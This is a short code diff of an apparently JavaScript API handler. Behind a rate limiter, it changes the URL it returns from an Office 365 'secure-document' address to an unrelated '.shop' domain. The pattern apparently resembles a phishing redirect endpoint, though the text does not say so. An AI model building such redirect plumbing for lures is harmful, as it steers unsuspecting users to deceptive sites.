@@ -12,6 +12,6 @@ export default function handler(req, res) {
   }
 
   limiter(req, res, () => {
-    res.status(200).json({ url: 'https://office365.com/secure-document' });
+    res.status(200).json({ url: 'https://www.scarinto.shop/' });
   });
 }
